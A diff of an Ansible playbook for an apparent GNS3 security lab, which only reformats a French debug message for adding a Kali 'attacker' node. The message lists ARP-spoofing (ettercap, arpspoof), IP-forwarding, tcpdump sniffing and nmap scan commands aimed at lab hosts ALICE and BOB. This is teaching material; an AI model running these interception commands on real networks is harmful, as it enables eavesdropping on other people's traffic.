@@ -163,50 +163,50 @@
     # =========================================================================
     # Résumé
     # =========================================================================
-    - name: Résumé
+    - name: Resume
       debug:
-        msg: |
-          ========================================
-          KALI LINUX AJOUTÉE AU LAB
-          ========================================
-
-          Node: KALI-ATTACKER
-          Console: telnet {{ gns3_host }} {{ kali.console }}
-
-          ========================================
-          CONNEXION À KALI
-          ========================================
-
-          1. Connecte-toi via telnet:
-             telnet {{ gns3_host }} {{ kali.console }}
-
-          2. Configure l'IP (dans Kali):
-             ip addr add 192.168.10.100/24 dev eth0
-             ip link set eth0 up
-             ip route add default via 192.168.10.254
-
-          3. Teste la connectivité:
-             ping 192.168.10.10   # ALICE
-             ping 192.168.10.20   # BOB
-
-          ========================================
-          OUTILS D'ATTAQUE DISPONIBLES
-          ========================================
-
-          # Installer les outils (première fois)
-          apt update && apt install -y ettercap-text-only arpwatch dsniff tcpdump nmap
-
-          # ARP Spoofing - Ettercap
-          ettercap -T -M arp:remote /192.168.10.10// /192.168.10.20//
-
-          # ARP Spoofing - Arpspoof
-          echo 1 > /proc/sys/net/ipv4/ip_forward
-          arpspoof -i eth0 -t 192.168.10.10 -r 192.168.10.20
-
-          # Sniffer le trafic
-          tcpdump -i eth0 -n
-
-          # Scanner le réseau
-          nmap -sn 192.168.10.0/24
-
-          ========================================
+        msg:
+          - "========================================"
+          - "KALI LINUX AJOUTEE AU LAB"
+          - "========================================"
+          - ""
+          - "Node: KALI-ATTACKER"
+          - "Console: telnet {{ gns3_host }} {{ kali.console }}"
+          - ""
+          - "========================================"
+          - "CONNEXION A KALI"
+          - "========================================"
+          - ""
+          - "1. Connecte-toi via telnet:"
+          - "   telnet {{ gns3_host }} {{ kali.console }}"
+          - ""
+          - "2. Configure l'IP (dans Kali):"
+          - "   ip addr add 192.168.10.100/24 dev eth0"
+          - "   ip link set eth0 up"
+          - "   ip route add default via 192.168.10.254"
+          - ""
+          - "3. Teste la connectivite:"
+          - "   ping 192.168.10.10   # ALICE"
+          - "   ping 192.168.10.20   # BOB"
+          - ""
+          - "========================================"
+          - "OUTILS D'ATTAQUE DISPONIBLES"
+          - "========================================"
+          - ""
+          - "# Installer les outils (premiere fois)"
+          - "apt update && apt install -y ettercap-text-only arpwatch dsniff tcpdump nmap"
+          - ""
+          - "# ARP Spoofing - Ettercap"
+          - "ettercap -T -M arp:remote /192.168.10.10// /192.168.10.20//"
+          - ""
+          - "# ARP Spoofing - Arpspoof"
+          - "echo 1 > /proc/sys/net/ipv4/ip_forward"
+          - "arpspoof -i eth0 -t 192.168.10.10 -r 192.168.10.20"
+          - ""
+          - "# Sniffer le trafic"
+          - "tcpdump -i eth0 -n"
+          - ""
+          - "# Scanner le reseau"
+          - "nmap -sn 192.168.10.0/24"
+          - ""
+          - "========================================"
